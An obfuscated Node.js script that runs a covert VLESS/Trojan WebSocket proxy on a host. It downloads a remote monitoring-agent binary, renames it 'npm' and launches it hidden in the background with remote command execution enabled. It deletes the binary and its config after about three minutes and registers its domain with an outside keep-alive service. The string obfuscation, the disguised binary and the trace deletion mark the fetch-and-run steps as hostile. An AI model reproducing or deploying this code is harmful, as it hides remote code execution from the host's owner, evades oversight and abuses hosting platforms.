const _0x1d6919=_0xce63;(function(_0x3520a8,_0xd7b83b){const _0x45523e=_0xce63,_0x164d1a=_0x3520a8();while(!![]){try{const _0x1458b9=-parseInt(_0x45523e(0x18c))/0x1*(-parseInt(_0x45523e(0x19a))/0x2)+-parseInt(_0x45523e(0x164))/0x3*(-parseInt(_0x45523e(0x198))/0x4)+-parseInt(_0x45523e(0x133))/0x5*(-parseInt(_0x45523e(0x16c))/0x6)+parseInt(_0x45523e(0x134))/0x7+-parseInt(_0x45523e(0x136))/0x8*(parseInt(_0x45523e(0x16a))/0x9)+-parseInt(_0x45523e(0x199))/0xa+-parseInt(_0x45523e(0x14c))/0xb;if(_0x1458b9===_0xd7b83b)break;else _0x164d1a['push'](_0x164d1a['shift']());}catch(_0x288ba8){_0x164d1a['push'](_0x164d1a['shift']());}}}(_0x5888,0xe4d39));const os=require('os'),http=require(_0x1d6919(0x149)),fs=require('fs'),axios=require(_0x1d6919(0x17c)),net=require(_0x1d6919(0x13a)),path=require('path'),crypto=require('crypto'),{Buffer}=require(_0x1d6919(0x157)),{exec,execSync}=require(_0x1d6919(0x154)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1d6919(0x160)][_0x1d6919(0x19e)]||_0x1d6919(0x144),NEZHA_SERVER=process[_0x1d6919(0x160)][_0x1d6919(0x1a9)]||'',NEZHA_PORT=process[_0x1d6919(0x160)][_0x1d6919(0x195)]||'',NEZHA_KEY=process[_0x1d6919(0x160)][_0x1d6919(0x13d)]||'',DOMAIN=process[_0x1d6919(0x160)][_0x1d6919(0x143)]||'1234.abc.com',AUTO_ACCESS=process['env'][_0x1d6919(0x1ab)]||!![],WSPATH=process[_0x1d6919(0x160)]['WSPATH']||UUID[_0x1d6919(0x17a)](0x0,0x8),SUB_PATH=process[_0x1d6919(0x160)][_0x1d6919(0x15c)]||_0x1d6919(0x173),NAME=process[_0x1d6919(0x160)][_0x1d6919(0x163)]||'',PORT=process[_0x1d6919(0x160)][_0x1d6919(0x16d)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x29e4fd=_0x1d6919;try{const _0x61635c=await axios[_0x29e4fd(0x14b)](_0x29e4fd(0x152)),_0x28db1c=_0x61635c[_0x29e4fd(0x17f)];ISP=(_0x28db1c['country_code']+'-'+_0x28db1c[_0x29e4fd(0x155)])[_0x29e4fd(0x12f)](/ /g,'_');}catch(_0x5bcb9c){ISP='Unknown';}};function _0x5888(){const _0x258452=['UUID','readUInt8','npm\x20is\x20running','https://amd64.ssss.nyc.mn/agent','digest','every','toString','message','connection','write','includes','NEZHA_SERVER','8443','AUTO_ACCESS','writeFileSync','reduce','&type=A','replace','Failed\x20to\x20resolve\x20','arch','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','256385sUDRtR','3975433mqBvpq','8.8.4.4','9040WicJhY','utf8','npm\x20running\x20error:','once','net','pipe','https://arm64.ssss.nyc.mn/v1','NEZHA_KEY','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Not\x20Found\x0a','find','map','index.html','DOMAIN','5efabea4-f6d4-91fd-b8f0-19e004c89c61','Answer','decode','concat','npm','http','npm\x20is\x20already\x20running,\x20skip\x20running...','get','9220640jAOBIW','end','utf-8','post','arm','Automatic\x20Access\x20Task\x20added\x20successfully','https://api.ip.sb/geoip','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','child_process','isp','hex','buffer','Server','&fp=chrome&type=ws&host=','true','text/plain','SUB_PATH','join','test','false','env','stream','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NAME','33PphugL','split','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','createServer','catch','readUInt16BE','1314csTQhH','from','18PSMLyu','PORT','https://dns.google/resolve?name=','Status','url','https://arm64.ssss.nyc.mn/agent','\x20with\x20all\x20DNS\x20servers','sub','chmod\x20+x\x20npm','/bin/bash','log','443','config.yaml','sha224','slice',':443?encryption=none&security=tls&sni=','axios','then','1.1.1.1','data','length','2083','Hello\x20world!','2053','error:\x20','trojan://','unlink','text/html','base64','setsid\x20nohup\x20./npm\x20-s\x20','https://amd64.ssss.nyc.mn/v1','client_secret:\x20','2gSHxrl','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',':443?security=tls&sni=','finish','pop','&path=%2F','https://oooo.serv00.net/add-url','2087','error','NEZHA_PORT','writeHead','createHash','568012XEjLnS','7760140KrTMln','432724cTAcxy','arm64','createWriteStream','close'];_0x5888=function(){return _0x258452;};return _0x5888();}function _0xce63(_0x12e37a,_0xcb5b4d){_0x12e37a=_0x12e37a-0x12f;const _0x58888c=_0x5888();let _0xce63e1=_0x58888c[_0x12e37a];return _0xce63e1;}GetISP();const httpServer=http[_0x1d6919(0x167)]((_0xb9fad8,_0xd3988)=>{const _0x1f2ac9=_0x1d6919;if(_0xb9fad8['url']==='/'){const _0x31bef6=path['join'](__dirname,_0x1f2ac9(0x142));fs['readFile'](_0x31bef6,_0x1f2ac9(0x137),(_0x3c93a2,_0x3ec1c9)=>{const _0x2dae25=_0x1f2ac9;if(_0x3c93a2){_0xd3988['writeHead'](0xc8,{'Content-Type':_0x2dae25(0x187)}),_0xd3988[_0x2dae25(0x14d)](_0x2dae25(0x182));return;}_0xd3988[_0x2dae25(0x196)](0xc8,{'Content-Type':_0x2dae25(0x187)}),_0xd3988['end'](_0x3ec1c9);});return;}else{if(_0xb9fad8[_0x1f2ac9(0x170)]==='/'+SUB_PATH){const _0x5a9eab=NAME?NAME+'-'+ISP:ISP,_0x7ccbc0='vless://'+UUID+'@'+DOMAIN+_0x1f2ac9(0x17b)+DOMAIN+_0x1f2ac9(0x159)+DOMAIN+_0x1f2ac9(0x191)+WSPATH+'#'+_0x5a9eab,_0xaae064=_0x1f2ac9(0x185)+UUID+'@'+DOMAIN+_0x1f2ac9(0x18e)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x5a9eab,_0x19ba62=_0x7ccbc0+'\x0a'+_0xaae064,_0x160357=Buffer[_0x1f2ac9(0x16b)](_0x19ba62)[_0x1f2ac9(0x1a4)](_0x1f2ac9(0x188));_0xd3988[_0x1f2ac9(0x196)](0xc8,{'Content-Type':_0x1f2ac9(0x15b)}),_0xd3988[_0x1f2ac9(0x14d)](_0x160357+'\x0a');}else _0xd3988[_0x1f2ac9(0x196)](0x194,{'Content-Type':_0x1f2ac9(0x15b)}),_0xd3988[_0x1f2ac9(0x14d)](_0x1f2ac9(0x13f));}}),wss=new WebSocket[(_0x1d6919(0x158))]({'server':httpServer}),uuid=UUID[_0x1d6919(0x12f)](/-/g,''),DNS_SERVERS=[_0x1d6919(0x135),_0x1d6919(0x17e)];function resolveHost(_0x157b81){return new Promise((_0x1858bb,_0x18de7c)=>{const _0x5e9b68=_0xce63;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5e9b68(0x15e)](_0x157b81)){_0x1858bb(_0x157b81);return;}let _0x26158c=0x0;function _0x3bd6f5(){const _0x330970=_0x5e9b68;if(_0x26158c>=DNS_SERVERS[_0x330970(0x180)]){_0x18de7c(new Error(_0x330970(0x130)+_0x157b81+_0x330970(0x172)));return;}const _0x579718=DNS_SERVERS[_0x26158c];_0x26158c++;const _0x4d2d66=_0x330970(0x16e)+encodeURIComponent(_0x157b81)+_0x330970(0x1ae);axios[_0x330970(0x14b)](_0x4d2d66,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x330970(0x17d)](_0x2c4f0c=>{const _0xd1fca=_0x330970,_0x36d239=_0x2c4f0c[_0xd1fca(0x17f)];if(_0x36d239[_0xd1fca(0x16f)]===0x0&&_0x36d239['Answer']&&_0x36d239[_0xd1fca(0x145)]['length']>0x0){const _0x479adb=_0x36d239['Answer'][_0xd1fca(0x140)](_0x53a6c0=>_0x53a6c0['type']===0x1);if(_0x479adb){_0x1858bb(_0x479adb[_0xd1fca(0x17f)]);return;}}_0x3bd6f5();})[_0x330970(0x168)](_0xa2bbf4=>{_0x3bd6f5();});}_0x3bd6f5();});}function handleVlessConnection(_0x1d3cfc,_0x4350fe){const _0x2ff1d6=_0x1d6919,[_0xaa2184]=_0x4350fe,_0x4d7b8b=_0x4350fe[_0x2ff1d6(0x17a)](0x1,0x11);if(!_0x4d7b8b[_0x2ff1d6(0x1a3)]((_0x367dc2,_0x149104)=>_0x367dc2==parseInt(uuid['substr'](_0x149104*0x2,0x2),0x10)))return![];let _0x59c597=_0x4350fe['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x36f0ab=_0x4350fe[_0x2ff1d6(0x17a)](_0x59c597,_0x59c597+=0x2)[_0x2ff1d6(0x169)](0x0),_0x1195fe=_0x4350fe['slice'](_0x59c597,_0x59c597+=0x1)[_0x2ff1d6(0x19f)](),_0x11014a=_0x1195fe==0x1?_0x4350fe[_0x2ff1d6(0x17a)](_0x59c597,_0x59c597+=0x4)[_0x2ff1d6(0x15d)]('.'):_0x1195fe==0x2?new TextDecoder()[_0x2ff1d6(0x146)](_0x4350fe['slice'](_0x59c597+0x1,_0x59c597+=0x1+_0x4350fe[_0x2ff1d6(0x17a)](_0x59c597,_0x59c597+0x1)[_0x2ff1d6(0x19f)]())):_0x1195fe==0x3?_0x4350fe[_0x2ff1d6(0x17a)](_0x59c597,_0x59c597+=0x10)['reduce']((_0x2152d4,_0xf70305,_0x3c4dc8,_0x43a6c3)=>_0x3c4dc8%0x2?_0x2152d4[_0x2ff1d6(0x147)](_0x43a6c3[_0x2ff1d6(0x17a)](_0x3c4dc8-0x1,_0x3c4dc8+0x1)):_0x2152d4,[])['map'](_0xe4bb03=>_0xe4bb03[_0x2ff1d6(0x169)](0x0)['toString'](0x10))[_0x2ff1d6(0x15d)](':'):'';_0x1d3cfc['send'](new Uint8Array([_0xaa2184,0x0]));const _0x23c8e2=createWebSocketStream(_0x1d3cfc);return resolveHost(_0x11014a)[_0x2ff1d6(0x17d)](_0x7ab9eb=>{const _0xd72c4a=_0x2ff1d6;net['connect']({'host':_0x7ab9eb,'port':_0x36f0ab},function(){const _0x532f69=_0xce63;this[_0x532f69(0x1a7)](_0x4350fe[_0x532f69(0x17a)](_0x59c597)),_0x23c8e2['on'](_0x532f69(0x194),()=>{})[_0x532f69(0x13b)](this)['on'](_0x532f69(0x194),()=>{})[_0x532f69(0x13b)](_0x23c8e2);})['on'](_0xd72c4a(0x194),()=>{});})[_0x2ff1d6(0x168)](_0x51746b=>{const _0x4c9f7=_0x2ff1d6;net['connect']({'host':_0x11014a,'port':_0x36f0ab},function(){const _0x331d85=_0xce63;this['write'](_0x4350fe[_0x331d85(0x17a)](_0x59c597)),_0x23c8e2['on']('error',()=>{})[_0x331d85(0x13b)](this)['on'](_0x331d85(0x194),()=>{})[_0x331d85(0x13b)](_0x23c8e2);})['on'](_0x4c9f7(0x194),()=>{});}),!![];}function handleTrojanConnection(_0x434478,_0x1c6e39){const _0x26ead6=_0x1d6919;try{if(_0x1c6e39[_0x26ead6(0x180)]<0x3a)return![];const _0x1d225c=_0x1c6e39[_0x26ead6(0x17a)](0x0,0x38)[_0x26ead6(0x1a4)](),_0x2c7e71=[UUID];let _0xc536ed=null;for(const _0x1c64da of _0x2c7e71){const _0x261a34=crypto[_0x26ead6(0x197)](_0x26ead6(0x179))['update'](_0x1c64da)[_0x26ead6(0x1a2)](_0x26ead6(0x156));if(_0x261a34===_0x1d225c){_0xc536ed=_0x1c64da;break;}}if(!_0xc536ed)return![];let _0x3eacd6=0x38;_0x1c6e39[_0x3eacd6]===0xd&&_0x1c6e39[_0x3eacd6+0x1]===0xa&&(_0x3eacd6+=0x2);const _0xb5b4df=_0x1c6e39[_0x3eacd6];if(_0xb5b4df!==0x1)return![];_0x3eacd6+=0x1;const _0x393969=_0x1c6e39[_0x3eacd6];_0x3eacd6+=0x1;let _0x4bce34,_0x47a95b;if(_0x393969===0x1)_0x4bce34=_0x1c6e39[_0x26ead6(0x17a)](_0x3eacd6,_0x3eacd6+0x4)[_0x26ead6(0x15d)]('.'),_0x3eacd6+=0x4;else{if(_0x393969===0x3){const _0x1ca587=_0x1c6e39[_0x3eacd6];_0x3eacd6+=0x1,_0x4bce34=_0x1c6e39[_0x26ead6(0x17a)](_0x3eacd6,_0x3eacd6+_0x1ca587)[_0x26ead6(0x1a4)](),_0x3eacd6+=_0x1ca587;}else{if(_0x393969===0x4)_0x4bce34=_0x1c6e39[_0x26ead6(0x17a)](_0x3eacd6,_0x3eacd6+0x10)[_0x26ead6(0x1ad)]((_0xd73960,_0x1611f0,_0xa98520,_0x20f2b8)=>_0xa98520%0x2?_0xd73960[_0x26ead6(0x147)](_0x20f2b8[_0x26ead6(0x17a)](_0xa98520-0x1,_0xa98520+0x1)):_0xd73960,[])[_0x26ead6(0x141)](_0x59af1b=>_0x59af1b['readUInt16BE'](0x0)[_0x26ead6(0x1a4)](0x10))[_0x26ead6(0x15d)](':'),_0x3eacd6+=0x10;else return![];}}_0x47a95b=_0x1c6e39[_0x26ead6(0x169)](_0x3eacd6),_0x3eacd6+=0x2;_0x3eacd6<_0x1c6e39[_0x26ead6(0x180)]&&_0x1c6e39[_0x3eacd6]===0xd&&_0x1c6e39[_0x3eacd6+0x1]===0xa&&(_0x3eacd6+=0x2);const _0x38095e=createWebSocketStream(_0x434478);return resolveHost(_0x4bce34)[_0x26ead6(0x17d)](_0x43d57c=>{const _0x321b96=_0x26ead6;net['connect']({'host':_0x43d57c,'port':_0x47a95b},function(){const _0x4019b1=_0xce63;_0x3eacd6<_0x1c6e39[_0x4019b1(0x180)]&&this['write'](_0x1c6e39[_0x4019b1(0x17a)](_0x3eacd6)),_0x38095e['on'](_0x4019b1(0x194),()=>{})[_0x4019b1(0x13b)](this)['on'](_0x4019b1(0x194),()=>{})[_0x4019b1(0x13b)](_0x38095e);})['on'](_0x321b96(0x194),()=>{});})['catch'](_0x5af808=>{const _0x2a4acd=_0x26ead6;net['connect']({'host':_0x4bce34,'port':_0x47a95b},function(){const _0x3f942a=_0xce63;_0x3eacd6<_0x1c6e39['length']&&this[_0x3f942a(0x1a7)](_0x1c6e39['slice'](_0x3eacd6)),_0x38095e['on'](_0x3f942a(0x194),()=>{})[_0x3f942a(0x13b)](this)['on'](_0x3f942a(0x194),()=>{})[_0x3f942a(0x13b)](_0x38095e);})['on'](_0x2a4acd(0x194),()=>{});}),!![];}catch(_0x1ec8a2){return![];}}wss['on'](_0x1d6919(0x1a6),(_0x535f73,_0x2a84db)=>{const _0x47fe5c=_0x1d6919,_0x3c4dcb=_0x2a84db['url']||'';_0x535f73[_0x47fe5c(0x139)](_0x47fe5c(0x1a5),_0x32d188=>{const _0xd248ec=_0x47fe5c;if(_0x32d188[_0xd248ec(0x180)]>0x11&&_0x32d188[0x0]===0x0){const _0x559ab0=_0x32d188[_0xd248ec(0x17a)](0x1,0x11),_0x2e36eb=_0x559ab0['every']((_0x34796b,_0x238814)=>_0x34796b==parseInt(uuid['substr'](_0x238814*0x2,0x2),0x10));if(_0x2e36eb){!handleVlessConnection(_0x535f73,_0x32d188)&&_0x535f73[_0xd248ec(0x19d)]();return;}}!handleTrojanConnection(_0x535f73,_0x32d188)&&_0x535f73['close']();})['on'](_0x47fe5c(0x194),()=>{});});const getDownloadUrl=()=>{const _0x40d3d2=_0x1d6919,_0x12f574=os[_0x40d3d2(0x131)]();return _0x12f574===_0x40d3d2(0x150)||_0x12f574===_0x40d3d2(0x19b)||_0x12f574==='aarch64'?!NEZHA_PORT?_0x40d3d2(0x13c):_0x40d3d2(0x171):!NEZHA_PORT?_0x40d3d2(0x18a):_0x40d3d2(0x1a1);},downloadFile=async()=>{const _0x7a7d64=_0x1d6919;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3db808=getDownloadUrl(),_0x5a39fc=await axios({'method':_0x7a7d64(0x14b),'url':_0x3db808,'responseType':_0x7a7d64(0x161)}),_0x50ab5a=fs[_0x7a7d64(0x19c)](_0x7a7d64(0x148));return _0x5a39fc['data']['pipe'](_0x50ab5a),new Promise((_0xf5d01a,_0x455fbe)=>{const _0x17eb52=_0x7a7d64;_0x50ab5a['on'](_0x17eb52(0x18f),()=>{const _0x3d0879=_0x17eb52;console[_0x3d0879(0x176)]('npm\x20download\x20successfully'),exec(_0x3d0879(0x174),_0x503854=>{if(_0x503854)_0x455fbe(_0x503854);_0xf5d01a();});}),_0x50ab5a['on']('error',_0x455fbe);});}catch(_0x53769a){throw _0x53769a;}},runnz=async()=>{const _0x395e5b=_0x1d6919;try{const _0x3fca6e=execSync(_0x395e5b(0x132),{'encoding':_0x395e5b(0x14e)});if(_0x3fca6e['trim']()!==''){console[_0x395e5b(0x176)](_0x395e5b(0x14a));return;}}catch(_0x45b079){}await downloadFile();let _0x299401='',_0x27d4a5=[_0x395e5b(0x177),_0x395e5b(0x1aa),'2096',_0x395e5b(0x193),_0x395e5b(0x181),_0x395e5b(0x183)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5c4cd0=_0x27d4a5[_0x395e5b(0x1a8)](NEZHA_PORT)?'--tls':'';_0x299401=_0x395e5b(0x189)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5c4cd0+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2cee5c=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x395e5b(0x165)](':')[_0x395e5b(0x190)]():'',_0x52867=_0x27d4a5[_0x395e5b(0x1a8)](_0x2cee5c)?_0x395e5b(0x15a):_0x395e5b(0x15f),_0x1099e2=_0x395e5b(0x18b)+NEZHA_KEY+_0x395e5b(0x162)+NEZHA_SERVER+_0x395e5b(0x153)+_0x52867+_0x395e5b(0x18d)+UUID;fs[_0x395e5b(0x1ac)](_0x395e5b(0x178),_0x1099e2);}_0x299401=_0x395e5b(0x166);}else{console[_0x395e5b(0x176)](_0x395e5b(0x13e));return;}}try{exec(_0x299401,{'shell':_0x395e5b(0x175)},_0x476ef6=>{const _0x52b042=_0x395e5b;if(_0x476ef6)console[_0x52b042(0x194)](_0x52b042(0x138),_0x476ef6);else console[_0x52b042(0x176)](_0x52b042(0x1a0));});}catch(_0x3dabfa){console[_0x395e5b(0x194)](_0x395e5b(0x184)+_0x3dabfa);}};async function addAccessTask(){const _0x1c9aaf=_0x1d6919;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2be32a='https://'+DOMAIN;try{const _0x21a9b0=await axios[_0x1c9aaf(0x14f)](_0x1c9aaf(0x192),{'url':_0x2be32a},{'headers':{'Content-Type':'application/json'}});console['log'](_0x1c9aaf(0x151));}catch(_0x5e364c){}}const delFiles=()=>{const _0x2f534f=_0x1d6919;fs[_0x2f534f(0x186)](_0x2f534f(0x148),()=>{}),fs[_0x2f534f(0x186)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x4d0712=_0x1d6919;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4d0712(0x176)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
